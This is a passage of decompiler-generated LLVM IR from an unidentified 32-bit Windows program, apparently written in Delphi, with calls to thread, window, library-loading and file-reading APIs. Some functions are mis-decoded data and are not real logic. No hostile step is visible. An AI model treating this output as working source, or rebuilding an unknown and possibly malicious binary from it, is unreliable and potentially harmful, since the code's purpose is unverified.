  br label %dec_label_pc_4065d1, !insn.addr !1459

dec_label_pc_406509:                              ; preds = %dec_label_pc_406357
  %124 = call i32 @function_4034c8(), !insn.addr !1460
  %125 = icmp slt i32 %124, 5, !insn.addr !1461
  store i32* %60, i32** %.pre-phi.reg2mem, !insn.addr !1461
  store i32 %59, i32* %esp.1.reg2mem, !insn.addr !1461
  br i1 %125, label %dec_label_pc_4065d1, label %dec_label_pc_40651a, !insn.addr !1461

dec_label_pc_40651a:                              ; preds = %dec_label_pc_406509
  %126 = add i32 %esp.0.reload, -40, !insn.addr !1462
  %127 = inttoptr i32 %126 to i32*, !insn.addr !1462
  store i32 ptrtoint ([5 x i8]* @global_var_40665c to i32), i32* %127, align 4, !insn.addr !1462
  %128 = call i32 @function_404b20(), !insn.addr !1463
  %129 = add i32 %esp.0.reload, -44, !insn.addr !1464
  %130 = inttoptr i32 %129 to i32*, !insn.addr !1464
  %131 = add i32 %esp.0.reload, -48, !insn.addr !1465
  %132 = inttoptr i32 %131 to i32*, !insn.addr !1465
  store i32 ptrtoint ([7 x i8]* @global_var_40666c to i32), i32* %132, align 4, !insn.addr !1465
  %133 = call i32 @function_404b20(), !insn.addr !1466
  %134 = add i32 %esp.0.reload, -52, !insn.addr !1467
  %135 = inttoptr i32 %134 to i32*
  %136 = call i32 @"@LStrCatN"(), !insn.addr !1468
  %137 = add i32 %esp.0.reload, -56, !insn.addr !1469
  %138 = inttoptr i32 %137 to i32*, !insn.addr !1469
  %139 = call i32 @"@LStrFromPChar"(), !insn.addr !1470
  %140 = call i32 @function_4060f0(), !insn.addr !1471
  %141 = call i32 @function_404c78(), !insn.addr !1472
  store i32* %135, i32** %.pre-phi.reg2mem, !insn.addr !1473
  store i32 %134, i32* %esp.1.reg2mem, !insn.addr !1473
  br label %dec_label_pc_4065d1, !insn.addr !1473

dec_label_pc_406577:                              ; preds = %dec_label_pc_406357
  %142 = call i32 @function_4034c8(), !insn.addr !1474
  %143 = icmp slt i32 %142, 5, !insn.addr !1475
  store i32* %60, i32** %.pre-phi.reg2mem, !insn.addr !1475
  store i32 %59, i32* %esp.1.reg2mem, !insn.addr !1475
  br i1 %143, label %dec_label_pc_4065d1, label %dec_label_pc_406584, !insn.addr !1475

dec_label_pc_406584:                              ; preds = %dec_label_pc_406577
  %144 = add i32 %esp.0.reload, -40, !insn.addr !1476
  %145 = inttoptr i32 %144 to i32*, !insn.addr !1476
  store i32 ptrtoint ([5 x i8]* @global_var_40665c to i32), i32* %145, align 4, !insn.addr !1476
  %146 = call i32 @function_404b20(), !insn.addr !1477
  %147 = add i32 %esp.0.reload, -44, !insn.addr !1478
  %148 = inttoptr i32 %147 to i32*, !insn.addr !1478
  %149 = add i32 %esp.0.reload, -48, !insn.addr !1479
  %150 = inttoptr i32 %149 to i32*, !insn.addr !1479
  store i32 ptrtoint ([7 x i8]* @global_var_40666c to i32), i32* %150, align 4, !insn.addr !1479
  %151 = call i32 @function_404b20(), !insn.addr !1480
  %152 = add i32 %esp.0.reload, -52, !insn.addr !1481
  %153 = inttoptr i32 %152 to i32*
  %154 = call i32 @"@LStrCatN"(), !insn.addr !1482
  %155 = add i32 %esp.0.reload, -56, !insn.addr !1483
  %156 = inttoptr i32 %155 to i32*, !insn.addr !1483
  %157 = call i32 @function_4060f0(), !insn.addr !1484
  %158 = call i32 @function_404c78(), !insn.addr !1485
  store i32* %153, i32** %.pre-phi.reg2mem, !insn.addr !1485
  store i32 %152, i32* %esp.1.reg2mem, !insn.addr !1485
  br label %dec_label_pc_4065d1, !insn.addr !1485

dec_label_pc_4065d1:                              ; preds = %dec_label_pc_406357, %dec_label_pc_406584, %dec_label_pc_406577, %dec_label_pc_40651a, %dec_label_pc_406509, %dec_label_pc_4063da, %dec_label_pc_4063c9
  %159 = add i32 %esp.0.reload, -16, !insn.addr !1486
  %160 = inttoptr i32 %159 to i32*, !insn.addr !1486
  %esp.1.reload = load i32, i32* %esp.1.reg2mem
  %.pre-phi.reload = load i32*, i32** %.pre-phi.reg2mem
  %161 = load i32, i32* %.pre-phi.reload, align 4, !insn.addr !1487
  call void @__writefsdword(i32 0, i32 %161), !insn.addr !1488
  %162 = add i32 %esp.1.reload, 8, !insn.addr !1489
  %163 = inttoptr i32 %162 to i32*, !insn.addr !1489
  store i32 4220403, i32* %163, align 4, !insn.addr !1489
  %164 = call i32 @"@LStrArrayClr"(), !insn.addr !1490
  ret i32 %164, !insn.addr !1491
}

define i32 @function_4065ec() local_unnamed_addr {
dec_label_pc_4065ec:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !1492
  ret i32 %0, !insn.addr !1492
}

define i32 @function_4065f1() local_unnamed_addr {
dec_label_pc_4065f1:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1493
}

define i32 @function_4065f3(i32 %arg1) local_unnamed_addr {
dec_label_pc_4065f3:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1494
}

define i32 @function_40661f() local_unnamed_addr {
dec_label_pc_40661f:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1495
}

define i32 @function_406627() local_unnamed_addr {
dec_label_pc_406627:
  %0 = call i32 @__decompiler_undefined_function_0()
  %eax = alloca i32, align 4
  %1 = add i32 %0, 1, !insn.addr !1496
  %2 = inttoptr i32 %0 to i32*, !insn.addr !1496
  store i32 %1, i32* %2, align 4, !insn.addr !1496
  %3 = bitcast i32* %eax to i8*
  %4 = load i8, i8* %3, align 4, !insn.addr !1497
  %5 = load i32, i32* %eax, align 4
  %6 = trunc i32 %5 to i8, !insn.addr !1497
  %7 = add i8 %4, %6, !insn.addr !1497
  %8 = inttoptr i32 %5 to i8*, !insn.addr !1497
  store i8 %7, i8* %8, align 1, !insn.addr !1497
  %9 = load i8, i8* %3, align 4, !insn.addr !1498
  %10 = load i32, i32* %eax, align 4
  %11 = udiv i32 %10, 256, !insn.addr !1498
  %12 = trunc i32 %11 to i8, !insn.addr !1498
  %13 = add i8 %9, %12, !insn.addr !1498
  %14 = inttoptr i32 %10 to i8*, !insn.addr !1498
  store i8 %13, i8* %14, align 1, !insn.addr !1498
  %15 = load i32, i32* %eax, align 4, !insn.addr !1499
  ret i32 %15, !insn.addr !1499
}

define i32 @function_40662e() local_unnamed_addr {
dec_label_pc_40662e:
  %0 = call i32 @function_40666c(), !insn.addr !1500
  ret i32 %0, !insn.addr !1500
}

define i32 @function_40666a() local_unnamed_addr {
dec_label_pc_40666a:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = trunc i32 %0 to i8
  %2 = mul i8 %1, 2, !insn.addr !1501
  %3 = inttoptr i32 %0 to i8*, !insn.addr !1501
  store i8 %2, i8* %3, align 1, !insn.addr !1501
  ret i32 %0, !insn.addr !1501
}

define i32 @function_40666c() local_unnamed_addr {
dec_label_pc_40666c:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %2 = call i32 @__decompiler_undefined_function_0()
  %3 = call i1 @__decompiler_undefined_function_1()
  %4 = call i1 @__decompiler_undefined_function_1()
  br i1 %3, label %dec_label_pc_4066d0, label %dec_label_pc_40666f, !insn.addr !1502

dec_label_pc_40666f:                              ; preds = %dec_label_pc_40666c
  %5 = icmp eq i1 %4, false, !insn.addr !1503
  br i1 %5, label %dec_label_pc_4066e4, label %dec_label_pc_406671, !insn.addr !1503

dec_label_pc_406671:                              ; preds = %dec_label_pc_40666f
  ret i32 %2, !insn.addr !1504

dec_label_pc_4066d0:                              ; preds = %dec_label_pc_40666c
  %6 = call i32 @function_4045ac(), !insn.addr !1505
  br label %dec_label_pc_4066e4, !insn.addr !1506

dec_label_pc_4066e4:                              ; preds = %dec_label_pc_4066d0, %dec_label_pc_40666f
  %7 = call i32* @CreateThread(%_SECURITY_ATTRIBUTES* null, i32 ptrtoint (i32* @0 to i32), i32 (i32*)* bitcast (i32* @0 to i32 (i32*)*), i32* nonnull @0, i32 ptrtoint (i32* @0 to i32), i32* nonnull @0), !insn.addr !1507
  %8 = call i32* @CreateThread(%_SECURITY_ATTRIBUTES* bitcast (i32* @0 to %_SECURITY_ATTRIBUTES*), i32 ptrtoint (i32* @0 to i32), i32 (i32*)* bitcast (i32* @0 to i32 (i32*)*), i32* nonnull @0, i32 ptrtoint (i32* @0 to i32), i32* nonnull @0), !insn.addr !1508
  %9 = add i32 %0, 20, !insn.addr !1509
  %10 = inttoptr i32 %9 to i32*, !insn.addr !1509
  %11 = load i32, i32* %10, align 4, !insn.addr !1509
  %12 = add i32 %0, 16, !insn.addr !1510
  %13 = inttoptr i32 %12 to i32*, !insn.addr !1510
  %14 = load i32, i32* %13, align 4, !insn.addr !1510
  %15 = add i32 %0, 8, !insn.addr !1511
  %16 = inttoptr i32 %15 to i32*, !insn.addr !1511
  %17 = load i32, i32* %16, align 4, !insn.addr !1511
  %18 = inttoptr i32 %11 to i32*, !insn.addr !1512
  %19 = call i32 @DefWindowProcA(i32* %18, i32 %14, i32 %1, i32 %17), !insn.addr !1512
  ret i32 %19, !insn.addr !1513
}

define i32 @function_40671c() local_unnamed_addr {
dec_label_pc_40671c:
  %0 = load i32 (i32, i32, i32)*, i32 (i32, i32, i32)** @global_var_409650, align 4
  %1 = ptrtoint i32 (i32, i32, i32)* %0 to i32
  %2 = call i32* @CreateWindowExA(i32 0, i8* null, i8* null, i32 0, i32 0, i32 0, i32 0, i32 %1, i32* null, i32* nonnull @0, i32* nonnull @0, i32* nonnull @0), !insn.addr !1514
  %3 = ptrtoint i32* %2 to i32, !insn.addr !1514
  %4 = call i32 @SetWindowLongA(i32* inttoptr (i32 4220576 to i32*), i32 -4, i32 %3), !insn.addr !1515
  ret i32 %4, !insn.addr !1516
}

define i32 @function_406751(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
dec_label_pc_406751:
  %merge7.reg2mem = alloca i32, !insn.addr !1517
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %2 = trunc i32 %1 to i8
  %3 = mul i8 %2, 2, !insn.addr !1517
  %4 = inttoptr i32 %1 to i8*, !insn.addr !1517
  store i8 %3, i8* %4, align 1, !insn.addr !1517
  %5 = add i32 %1, 114, !insn.addr !1518
  %6 = inttoptr i32 %5 to i8*, !insn.addr !1518
  %7 = load i8, i8* %6, align 1, !insn.addr !1518
  %8 = udiv i32 %0, 256, !insn.addr !1518
  %9 = trunc i32 %8 to i8, !insn.addr !1518
  %10 = add i8 %7, %9, !insn.addr !1518
  store i8 %10, i8* %6, align 1, !insn.addr !1518
  %11 = add i8 %2, -32, !insn.addr !1519
  %12 = icmp ult i8 %2, 32, !insn.addr !1519
  %13 = icmp eq i8 %11, 0, !insn.addr !1519
  %14 = zext i8 %11 to i32, !insn.addr !1519
  %15 = and i32 %1, -256, !insn.addr !1519
  %16 = or i32 %15, %14, !insn.addr !1519
  %17 = or i1 %12, %13, !insn.addr !1520
  store i32 %16, i32* %merge7.reg2mem, !insn.addr !1520
  br i1 %17, label %dec_label_pc_40675a, label %dec_label_pc_4067ab, !insn.addr !1520

dec_label_pc_40675a:                              ; preds = %dec_label_pc_406751
  %18 = add i32 %16, 105, !insn.addr !1521
  %19 = inttoptr i32 %18 to i8*, !insn.addr !1521
  %20 = load i8, i8* %19, align 1, !insn.addr !1521
  %21 = and i8 %20, %9, !insn.addr !1521
  store i8 %21, i8* %19, align 1, !insn.addr !1521
  %22 = trunc i32 %arg3 to i16, !insn.addr !1522
  %23 = inttoptr i32 %arg6 to i8*, !insn.addr !1522
  %24 = load i8, i8* %23, align 1, !insn.addr !1522
  call void @__asm_outsb(i16 %22, i8 %24), !insn.addr !1522
  %25 = add i32 %arg5, 105, !insn.addr !1523
  %26 = and i32 %25, 65535
  %27 = inttoptr i32 %26 to i8*, !insn.addr !1523
  %28 = load i8, i8* %27, align 1, !insn.addr !1523
  %29 = udiv i32 %arg2, 256, !insn.addr !1523
  %30 = trunc i32 %29 to i8, !insn.addr !1523
  %31 = and i8 %28, %30, !insn.addr !1523
  store i8 %31, i8* %27, align 1, !insn.addr !1523
  %32 = mul i32 %arg5, 2, !insn.addr !1524
  %33 = add i32 %arg2, 115, !insn.addr !1524
  %34 = add i32 %33, %32, !insn.addr !1524
  %35 = inttoptr i32 %34 to i8*, !insn.addr !1524
  %36 = load i8, i8* %35, align 1, !insn.addr !1524
  %37 = trunc i32 %arg2 to i8, !insn.addr !1524
  %38 = add i8 %36, %37, !insn.addr !1524
  %39 = icmp eq i8 %38, 0, !insn.addr !1524
  store i8 %38, i8* %35, align 1, !insn.addr !1524
  store i32 %arg1, i32* %merge7.reg2mem, !insn.addr !1525
  br i1 %39, label %dec_label_pc_4067ab, label %dec_label_pc_406769, !insn.addr !1525

dec_label_pc_406769:                              ; preds = %dec_label_pc_40675a
  %40 = inttoptr i32 %arg6 to i32*, !insn.addr !1526
  %41 = load i32, i32* %40, align 4, !insn.addr !1526
  call void @__asm_outsd(i16 %22, i32 %41), !insn.addr !1526
  %42 = inttoptr i32 %arg5 to i8*, !insn.addr !1527
  %43 = call i32* @FindWindowA(i8* %42, i8* bitcast (i32* @0 to i8*)), !insn.addr !1527
  %44 = ptrtoint i32* %43 to i32, !insn.addr !1527
  %45 = icmp eq i32* %43, null, !insn.addr !1528
  %46 = icmp eq i1 %45, false, !insn.addr !1529
  store i32 %44, i32* %merge7.reg2mem, !insn.addr !1529
  br i1 %46, label %dec_label_pc_4067ab, label %dec_label_pc_40678d, !insn.addr !1529

dec_label_pc_40678d:                              ; preds = %dec_label_pc_406769
  %47 = call i32 @function_40671c(), !insn.addr !1530
  %48 = call i32 @function_4036c8(), !insn.addr !1531
  %49 = inttoptr i32 %48 to i8*, !insn.addr !1532
  %50 = call i32* @LoadLibraryA(i8* %49), !insn.addr !1533
  %51 = ptrtoint i32* %50 to i32, !insn.addr !1533
  ret i32 %51, !insn.addr !1534

dec_label_pc_4067ab:                              ; preds = %dec_label_pc_406751, %dec_label_pc_406769, %dec_label_pc_40675a
  %merge7.reload = load i32, i32* %merge7.reg2mem
  ret i32 %merge7.reload, !insn.addr !1535
}

define i32 @function_406871(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
dec_label_pc_406871:
  %esp.0.in.reg2mem = alloca i32*, !insn.addr !1536
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %2 = call i32 @__decompiler_undefined_function_0()
  %3 = call i32 @__decompiler_undefined_function_0()
  %4 = call i32 @__decompiler_undefined_function_0()
  %eax = alloca i32, align 4
  %stack_var_32 = alloca i32, align 4
  %stack_var_28 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_28, align 4
  %stack_var_16 = alloca i32, align 4
  store i32 %arg4, i32* %stack_var_16, align 4
  %5 = bitcast i32* %eax to i8*
  %6 = load i8, i8* %5, align 4, !insn.addr !1536
  %7 = load i32, i32* %eax, align 4
  %8 = trunc i32 %7 to i8, !insn.addr !1536
  %9 = add i8 %6, %8, !insn.addr !1536
  %10 = inttoptr i32 %7 to i8*, !insn.addr !1536
  store i8 %9, i8* %10, align 1, !insn.addr !1536
  %11 = load i32, i32* %eax, align 4, !insn.addr !1537
  %12 = add i32 %11, 114, !insn.addr !1537
  %13 = inttoptr i32 %12 to i8*, !insn.addr !1537
  %14 = load i8, i8* %13, align 1, !insn.addr !1537
  %15 = udiv i32 %2, 256, !insn.addr !1537
  %16 = trunc i32 %15 to i8, !insn.addr !1537
  %17 = add i8 %14, %16, !insn.addr !1537
  store i8 %17, i8* %13, align 1, !insn.addr !1537
  %18 = load i32, i32* %eax, align 4
  %19 = trunc i32 %18 to i8, !insn.addr !1538
  %20 = add i8 %19, -32, !insn.addr !1538
  %21 = icmp ult i8 %19, 32, !insn.addr !1538
  %22 = icmp eq i8 %20, 0, !insn.addr !1538
  %23 = zext i8 %20 to i32, !insn.addr !1538
  %24 = and i32 %18, -256, !insn.addr !1538
  %25 = or i32 %24, %23, !insn.addr !1538
  store i32 %25, i32* %eax, align 4, !insn.addr !1538
  %26 = or i1 %21, %22, !insn.addr !1539
  br i1 %26, label %dec_label_pc_40687a, label %dec_label_pc_4068e9, !insn.addr !1539

dec_label_pc_40687a:                              ; preds = %dec_label_pc_406871
  %27 = add i32 %25, 105, !insn.addr !1540
  %28 = inttoptr i32 %27 to i8*, !insn.addr !1540
  %29 = load i8, i8* %28, align 1, !insn.addr !1540
  %30 = and i8 %29, %16, !insn.addr !1540
  store i8 %30, i8* %28, align 1, !insn.addr !1540
  %31 = load i32, i32* %stack_var_28, align 4, !insn.addr !1541
  store i32 %31, i32* %eax, align 4, !insn.addr !1541
  %32 = trunc i32 %arg3 to i16, !insn.addr !1542
  %33 = inttoptr i32 %arg6 to i8*, !insn.addr !1542
  %34 = load i8, i8* %33, align 1, !insn.addr !1542
  call void @__asm_outsb(i16 %32, i8 %34), !insn.addr !1542
  %35 = add i32 %arg5, 105, !insn.addr !1543
  %36 = and i32 %35, 65535
  %37 = inttoptr i32 %36 to i8*, !insn.addr !1543
  %38 = load i8, i8* %37, align 1, !insn.addr !1543
  %39 = udiv i32 %arg2, 256, !insn.addr !1543
  %40 = trunc i32 %39 to i8, !insn.addr !1543
  %41 = and i8 %38, %40, !insn.addr !1543
  store i8 %41, i8* %37, align 1, !insn.addr !1543
  %42 = mul i32 %arg5, 2, !insn.addr !1544
  %43 = add i32 %arg2, 115, !insn.addr !1544
  %44 = add i32 %43, %42, !insn.addr !1544
  %45 = inttoptr i32 %44 to i8*, !insn.addr !1544
  %46 = load i8, i8* %45, align 1, !insn.addr !1544
  %47 = trunc i32 %arg2 to i8, !insn.addr !1544
  %48 = add i8 %46, %47, !insn.addr !1544
  %49 = icmp eq i8 %48, 0, !insn.addr !1544
  store i8 %48, i8* %45, align 1, !insn.addr !1544
  store i32* %stack_var_32, i32** %esp.0.in.reg2mem, !insn.addr !1545
  br i1 %49, label %dec_label_pc_4068cb, label %dec_label_pc_406889, !insn.addr !1545

dec_label_pc_406889:                              ; preds = %dec_label_pc_40687a
  %50 = icmp slt i8 %48, 0, !insn.addr !1544
  %51 = inttoptr i32 %arg6 to i32*, !insn.addr !1546
  %52 = load i32, i32* %51, align 4, !insn.addr !1546
  call void @__asm_outsd(i16 %32, i32 %52), !insn.addr !1546
  br i1 %50, label %dec_label_pc_406900, label %dec_label_pc_40688e, !insn.addr !1547

dec_label_pc_40688e:                              ; preds = %dec_label_pc_406889
  %53 = load i32, i32* %eax, align 4
  %54 = trunc i32 %53 to i8, !insn.addr !1548
  %55 = add i8 %54, -32, !insn.addr !1548
  %56 = icmp ult i8 %54, 32, !insn.addr !1548
  %57 = icmp eq i8 %55, 0, !insn.addr !1548
  %58 = zext i8 %55 to i32, !insn.addr !1548
  %59 = and i32 %53, -256, !insn.addr !1548
  %60 = or i32 %59, %58, !insn.addr !1548
  store i32 %60, i32* %eax, align 4, !insn.addr !1548
  %61 = or i1 %56, %57, !insn.addr !1549
  br i1 %61, label %dec_label_pc_406892, label %dec_label_pc_406901, !insn.addr !1549

dec_label_pc_406892:                              ; preds = %dec_label_pc_40688e
  %62 = add i32 %arg2, 105, !insn.addr !1550
  %63 = inttoptr i32 %62 to i8*, !insn.addr !1550
  %64 = load i8, i8* %63, align 1, !insn.addr !1550
  %65 = udiv i32 %53, 256, !insn.addr !1550
  %66 = trunc i32 %65 to i8, !insn.addr !1550
  %67 = and i8 %64, %66, !insn.addr !1550
  store i8 %67, i8* %63, align 1, !insn.addr !1550
  %68 = add i32 %arg6, 105, !insn.addr !1551
  %69 = inttoptr i32 %68 to i8*, !insn.addr !1551
  %70 = load i8, i8* %69, align 1, !insn.addr !1551
  %71 = and i8 %70, %40, !insn.addr !1551
  store i8 %71, i8* %69, align 1, !insn.addr !1551
  %72 = load i32, i32* %eax, align 4
  %73 = inttoptr i32 %72 to i8*, !insn.addr !1552
  %74 = load i8, i8* %73, align 1, !insn.addr !1552
  %75 = trunc i32 %72 to i8, !insn.addr !1552
  %76 = add i8 %74, %75, !insn.addr !1552
  store i8 %76, i8* %73, align 1, !insn.addr !1552
  %77 = load i32, i32* %eax, align 4
  %78 = inttoptr i32 %77 to i8*, !insn.addr !1553
  %79 = load i8, i8* %78, align 1, !insn.addr !1553
  %80 = trunc i32 %77 to i8, !insn.addr !1553
  %81 = add i8 %79, %80, !insn.addr !1553
  store i8 %81, i8* %78, align 1, !insn.addr !1553
  %82 = inttoptr i32 %arg2 to i32*, !insn.addr !1554
  %83 = load i32, i32* %82, align 4, !insn.addr !1554
  %84 = add i32 %83, %arg6, !insn.addr !1554
  store i32 %84, i32* %82, align 4, !insn.addr !1554
  %85 = load i32, i32* %eax, align 4
  %86 = inttoptr i32 %85 to i8*, !insn.addr !1555
  %87 = load i8, i8* %86, align 1, !insn.addr !1555
  %88 = trunc i32 %85 to i8, !insn.addr !1555
  %89 = add i8 %87, %88, !insn.addr !1555
  store i8 %89, i8* %86, align 1, !insn.addr !1555
  store i32 %arg5, i32* %stack_var_28, align 4, !insn.addr !1556
  %90 = call i32 @__readfsdword(i32 0), !insn.addr !1557
  store i32 %90, i32* %stack_var_16, align 4, !insn.addr !1557
  %91 = ptrtoint i32* %stack_var_16 to i32, !insn.addr !1557
  call void @__writefsdword(i32 0, i32 %91), !insn.addr !1558
  %92 = load i32, i32* @global_var_4096d4, align 4, !insn.addr !1559
  %93 = add i32 %92, 1, !insn.addr !1559
  %94 = icmp eq i32 %93, 0, !insn.addr !1559
  store i32 %93, i32* @global_var_4096d4, align 4, !insn.addr !1559
  %95 = icmp eq i1 %94, false, !insn.addr !1560
  br i1 %95, label %dec_label_pc_4068c3, label %dec_label_pc_4068b9, !insn.addr !1560

dec_label_pc_4068b9:                              ; preds = %dec_label_pc_406892
  %96 = call i32 @"@LStrClr"(), !insn.addr !1561
  br label %dec_label_pc_4068c3, !insn.addr !1561

dec_label_pc_4068c3:                              ; preds = %dec_label_pc_4068b9, %dec_label_pc_406892
  store i32 0, i32* %eax, align 4, !insn.addr !1562
  %97 = load i32, i32* %stack_var_16, align 4, !insn.addr !1563
  call void @__writefsdword(i32 0, i32 %97), !insn.addr !1564
  store i32* %stack_var_28, i32** %esp.0.in.reg2mem, !insn.addr !1564
  br label %dec_label_pc_4068cb, !insn.addr !1564

dec_label_pc_4068cb:                              ; preds = %dec_label_pc_4068c3, %dec_label_pc_40687a
  %esp.0.in.reload = load i32*, i32** %esp.0.in.reg2mem
  %esp.0 = ptrtoint i32* %esp.0.in.reload to i32
  %98 = add i32 %esp.0, -4, !insn.addr !1565
  %99 = inttoptr i32 %98 to i32*, !insn.addr !1565
  store i32 4221144, i32* %99, align 4, !insn.addr !1565
  %100 = load i32, i32* %eax, align 4, !insn.addr !1566
  ret i32 %100, !insn.addr !1566

dec_label_pc_4068e9:                              ; preds = %dec_label_pc_406871
  %101 = mul i32 %4, 2, !insn.addr !1567
  %102 = add i32 %1, 105, !insn.addr !1567
  %103 = add i32 %102, %101, !insn.addr !1567
  %104 = inttoptr i32 %103 to i32*, !insn.addr !1567
  %105 = load i32, i32* %104, align 4, !insn.addr !1567
  %106 = or i32 %105, %3, !insn.addr !1567
  store i32 %106, i32* %104, align 4, !insn.addr !1567
  %107 = add i32 %0, -1, !insn.addr !1568
  %108 = trunc i32 %3 to i16, !insn.addr !1569
  %109 = inttoptr i32 %107 to i32*, !insn.addr !1569
  %110 = load i32, i32* %109, align 4, !insn.addr !1569
  call void @__asm_outsd(i16 %108, i32 %110), !insn.addr !1569
  %111 = load i32, i32* %eax, align 4, !insn.addr !1570
  %112 = call i8 @__readgsbyte(i32 %111), !insn.addr !1570
  %113 = load i32, i32* %eax, align 4
  %114 = trunc i32 %113 to i8, !insn.addr !1570
  %115 = or i8 %112, %114, !insn.addr !1570
  call void @__writegsbyte(i32 %113, i8 %115), !insn.addr !1570
  %116 = load i32, i32* %eax, align 4
  %117 = inttoptr i32 %116 to i8*, !insn.addr !1571
  %118 = load i8, i8* %117, align 1, !insn.addr !1571
  %119 = trunc i32 %116 to i8, !insn.addr !1571
  %120 = add i8 %118, %119, !insn.addr !1571
  store i8 %120, i8* %117, align 1, !insn.addr !1571
  %121 = load i32, i32* %eax, align 4
  %122 = trunc i32 %121 to i8, !insn.addr !1572
  %123 = inttoptr i32 %121 to i8*, !insn.addr !1572
  %124 = load i8, i8* %123, align 1, !insn.addr !1572
  %125 = add i8 %124, %122, !insn.addr !1572
  %126 = zext i8 %125 to i32, !insn.addr !1572
  %127 = and i32 %121, -256, !insn.addr !1572
  %128 = or i32 %127, %126, !insn.addr !1572
  %129 = inttoptr i32 %128 to i8*, !insn.addr !1573
  %130 = load i8, i8* %129, align 1, !insn.addr !1573
  %131 = trunc i32 %3 to i8, !insn.addr !1574
  %132 = add i8 %125, %131, !insn.addr !1573
  %133 = add i8 %132, %130, !insn.addr !1574
  store i8 %133, i8* %129, align 1, !insn.addr !1574
  %134 = add i32 %128, 1, !insn.addr !1575
  store i32 %134, i32* %eax, align 4, !insn.addr !1575
  %135 = inttoptr i32 %134 to i8*, !insn.addr !1576
  %136 = load i8, i8* %135, align 1, !insn.addr !1576
  %137 = trunc i32 %134 to i8, !insn.addr !1576
  %138 = add i8 %136, %137, !insn.addr !1576
  store i8 %138, i8* %135, align 1, !insn.addr !1576
  br label %dec_label_pc_406900, !insn.addr !1576

dec_label_pc_406900:                              ; preds = %dec_label_pc_4068e9, %dec_label_pc_406889
  %139 = load i32, i32* %eax, align 4, !insn.addr !1576
  ret i32 %139, !insn.addr !1576

dec_label_pc_406901:                              ; preds = %dec_label_pc_40688e
  %140 = inttoptr i32 %60 to i8*, !insn.addr !1577
  %141 = load i8, i8* %140, align 1, !insn.addr !1577
  %142 = add i8 %141, %55, !insn.addr !1577
  store i8 %142, i8* %140, align 1, !insn.addr !1577
  %143 = load i32, i32* %eax, align 4
  %144 = inttoptr i32 %143 to i8*, !insn.addr !1578
  %145 = load i8, i8* %144, align 1, !insn.addr !1578
  %146 = trunc i32 %arg3 to i8, !insn.addr !1578
  %147 = add i8 %145, %146, !insn.addr !1578
  store i8 %147, i8* %144, align 1, !insn.addr !1578
  %148 = load i32, i32* %eax, align 4, !insn.addr !1579
  %149 = add i32 %148, 1, !insn.addr !1579
  %150 = mul i32 %149, 2, !insn.addr !1580
  %151 = inttoptr i32 %150 to i8*, !insn.addr !1580
  %152 = load i8, i8* %151, align 2, !insn.addr !1580
  %153 = trunc i32 %149 to i8, !insn.addr !1580
  %154 = add i8 %152, %153, !insn.addr !1580
  store i8 %154, i8* %151, align 2, !insn.addr !1580
  %155 = inttoptr i32 %149 to i8*, !insn.addr !1581
  %156 = load i8, i8* %155, align 1, !insn.addr !1581
  %157 = add i8 %156, %153, !insn.addr !1581
  store i8 %157, i8* %155, align 1, !insn.addr !1581
  ret i32 %149, !insn.addr !1582
}

define i32 @function_40691f() local_unnamed_addr {
dec_label_pc_40691f:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1583
}

define i32 @function_40692c() local_unnamed_addr {
dec_label_pc_40692c:
  %esp.1.reg2mem = alloca i32, !insn.addr !1584
  %stack_var_-116 = alloca i32, align 4
  %stack_var_-92 = alloca i32, align 4
  %stack_var_-84 = alloca i8*, align 4
  %stack_var_-56 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !1585
  store i32 %0, i32* %stack_var_-56, align 4, !insn.addr !1585
  %1 = ptrtoint i32* %stack_var_-56 to i32, !insn.addr !1585
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !1586
  %2 = call i32 @"@LStrCat3"(), !insn.addr !1587
  %3 = call i32 @function_4036c8(), !insn.addr !1588
  %4 = inttoptr i32 %3 to i8*, !insn.addr !1589
  store i8* %4, i8** %stack_var_-84, align 4, !insn.addr !1589
  %5 = ptrtoint i8** %stack_var_-84 to i32, !insn.addr !1589
  %6 = call i32* @CreateFileA(i8* %4, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), %_SECURITY_ATTRIBUTES* bitcast (i32* @0 to %_SECURITY_ATTRIBUTES*), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32* nonnull @0), !insn.addr !1590
  %7 = icmp eq i32* %6, inttoptr (i32 -1 to i32*), !insn.addr !1591
  store i32 %5, i32* %esp.1.reg2mem, !insn.addr !1592
  br i1 %7, label %dec_label_pc_406acb, label %dec_label_pc_406996, !insn.addr !1592

dec_label_pc_406996:                              ; preds = %dec_label_pc_40692c
  %8 = ptrtoint i32* %6 to i32, !insn.addr !1590
  store i32 %8, i32* %stack_var_-92, align 4, !insn.addr !1593
  %9 = ptrtoint i32* %stack_var_-92 to i32, !insn.addr !1593
  %10 = call i32 @GetFileSize(i32* null, i32* %6), !insn.addr !1594
  %11 = add i32 %10, 1
  %12 = icmp ult i32 %11, 2
  store i32 %9, i32* %esp.1.reg2mem, !insn.addr !1595
  br i1 %12, label %dec_label_pc_406acb, label %dec_label_pc_4069b2, !insn.addr !1595

dec_label_pc_4069b2:                              ; preds = %dec_label_pc_406996
  %13 = call i32 @"@LStrSetLength"(), !insn.addr !1596
  %14 = call i32 @function_403720(), !insn.addr !1597
  %15 = inttoptr i32 %14 to i32*, !insn.addr !1598
  %16 = call i1 @ReadFile(i32* %15, i32* %6, i32 ptrtoint (i32* @0 to i32), i32* nonnull @0, %_OVERLAPPED* bitcast (i32* @0 to %_OVERLAPPED*)), !insn.addr !1598
